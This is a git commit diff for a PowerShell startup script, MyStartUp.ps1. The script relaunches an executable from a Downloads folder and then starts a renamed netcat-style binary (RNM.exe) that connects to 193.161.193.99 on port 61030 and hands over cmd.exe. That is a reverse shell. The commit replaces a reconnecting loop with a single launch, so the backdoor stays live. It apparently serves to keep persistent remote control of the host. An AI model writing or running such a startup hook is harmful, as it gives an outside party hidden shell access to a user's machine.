2df0786df35f118a90e39dd0db8848fc8b9d38af
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2024-03-19 22:48:08 -0300

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,6 +1,3 @@
 taskkill /F /IM Dist.exe
 C:\Users\ALOOO\Downloads\Dist.exe
-while ($true) {
-    Start-Process -FilePath "C:\Users\Public\RNM.exe" -ArgumentList "-nv 193.161.193.99 61030 -e cmd.exe"
-    Start-Sleep -Seconds 5
-}
+Start-Process -FilePath "C:\Users\Public\RNM.exe" -ArgumentList "-nv 193.161.193.99 61030 -e cmd.exe"
